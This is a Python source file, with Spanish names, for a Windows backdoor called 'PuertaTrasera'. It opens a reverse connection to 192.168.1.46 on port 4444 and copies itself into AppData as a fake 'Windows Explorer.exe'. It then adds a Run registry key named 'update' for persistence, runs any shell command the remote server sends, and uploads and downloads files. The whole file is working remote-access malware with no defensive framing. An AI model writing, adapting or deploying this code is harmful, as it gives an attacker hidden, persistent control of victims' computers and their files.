#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class PuertaTrasera:
    def __init__(self, ip, puerto):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip, puerto))
        except Exception as e:
            print(f"[-] Error al conectar con el servidor: {str(e)}")
            sys.exit()

    def hacer_persistente(self):
        try:
            ruta_archivo_malicioso = os.environ["appdata"] + "\\Windows Explorer.exe"
            if not os.path.exists(ruta_archivo_malicioso):
                shutil.copyfile(sys.executable, ruta_archivo_malicioso)
                subprocess.call(
                    r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +
                    ruta_archivo_malicioso + '"', shell=True)
        except Exception as e:
            print(f"[-] Error al intentar hacer persistente: {str(e)}")

    def enviar_datos_confiablemente(self, datos):
        try:
            json_datos = json.dumps(datos)
            self.connection.send(json_datos.encode())
        except Exception as e:
            print(f"[-] Error al enviar datos: {str(e)}")
            self.connection.close()
            sys.exit()

    def recibir_datos_confiablemente(self):
        json_datos = b""
        while True:
            try:
                json_datos += self.connection.recv(1024)
                return json.loads(json_datos.decode())
            except ValueError:
                continue
            except Exception as e:
                print(f"[-] Error al recibir datos: {str(e)}")
                self.connection.close()
                sys.exit()

    def ejecutar_comando_del_sistema(self, comando):
        DEVNULL = open(os.devnull, 'wb')
        try:
            output = subprocess.check_output(comando, shell=True, stderr=DEVNULL, stdin=DEVNULL)
            return output.decode('utf-8', errors='ignore')
        except subprocess.CalledProcessError as e:
            return str(e)
        except Exception as e:
            return f"[-] Error al ejecutar el comando: {str(e)}"

    def cambiar_directorio_de_trabajo_a(self, ruta):
        try:
            os.chdir(ruta)
            return "[+] Cambiando directorio de trabajo a " + ruta
        except Exception as e:
            return f"[-] Error al cambiar el directorio de trabajo: {str(e)}"

    def leer_archivo(self, ruta):
        try:
            with open(ruta, "rb") as archivo:
                return base64.b64encode(archivo.read()).decode()
        except Exception as e:
            return f"[-] Error al leer el archivo: {str(e)}"

    def escribir_archivo(self, ruta, contenido):
        try:
            with open(ruta, "wb") as archivo:
                archivo.write(base64.b64decode(contenido.encode()))
                return "[+] Subida exitosa."
        except Exception as e:
            return f"[-] Error al escribir el archivo: {str(e)}"

    def ejecutar(self):
        while True:
            comando = self.recibir_datos_confiablemente()
            if not comando:
                break

            try:
                if comando[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif comando[0] == "cd" and len(comando) > 1:
                    resultado_comando = self.cambiar_directorio_de_trabajo_a(comando[1])
                elif comando[0] == "descargar":
                    resultado_comando = self.leer_archivo(comando[1])
                elif comando[0] == "subir":
                    resultado_comando = self.escribir_archivo(comando[1], comando[2])
                else:
                    resultado_comando = self.ejecutar_comando_del_sistema(comando)
            except Exception as e:
                resultado_comando = f"[-] Error durante la ejecución del comando: {str(e)}"

            self.enviar_datos_confiablemente(resultado_comando)


try:
    mi_puerta_trasera = PuertaTrasera("192.168.1.46", 4444)
    mi_puerta_trasera.hacer_persistente()
    mi_puerta_trasera.ejecutar()
except Exception as e:
    print(f"[-] Error al iniciar la puerta trasera: {str(e)}")
    sys.exit()
